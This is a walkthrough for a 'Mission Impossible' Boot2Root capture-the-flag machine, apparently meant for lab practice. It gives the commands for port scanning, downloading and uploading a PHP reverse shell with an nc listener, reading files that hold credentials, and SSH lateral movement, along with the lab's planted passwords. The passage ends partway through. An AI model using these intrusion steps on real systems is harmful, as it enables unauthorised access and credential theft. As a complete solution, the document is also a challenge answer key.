# Mission Impossible CTF Walkthrough

⚠ **Spoiler Warning**
This document contains the **complete solution** to the Mission Impossible Boot2Root CTF challenge.

---

# Phase 1 – Reconnaissance

First, scan the target machine to identify open ports and services.

```
nmap -sC -sV -p- TARGET_IP
```

### Open Ports Discovered

* **22** – SSH
* **80** – HTTP
* **8080** – Web Application
* **8081** – Secondary Web Portal

These services indicate the presence of a web application and possible remote access.

---

# Phase 2 – Web Enumeration

Visit the main web application:

```
http://TARGET_IP:8080
```

During enumeration, a **file upload feature** is discovered.

This feature is vulnerable and allows the upload of a **PHP reverse shell**.

---

# Phase 3 – Reverse Shell

Download the PentestMonkey PHP reverse shell.

```
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Edit the file to set your attacker machine IP and port.

```
nano php-reverse-shell.php
```

Start a listener on your attacker machine.

```
nc -lvnp 4444
```

Upload the reverse shell through the vulnerable upload form and access it through the browser.

This will establish a shell connection.

---

# Phase 4 – Credential Discovery

Inside the server, check the upload directory.

```
cat /var/www/uploads/.secret_clue.txt
```

This reveals credentials for a user account.

### Credentials

```
ethan_hunt : IMF_Protocol_2024
```

---

# Phase 5 – Lateral Movement

Use the discovered credentials to log in via SSH.

```
ssh ethan_hunt@TARGET_IP
```

After login, further enumeration reveals another web service running on **port 8081**.

```
http://TARGET_IP:8081
```

Viewing the **page source code** reveals another set of credentials.

```
luther_stickell : HackerInChief_1996
`
```
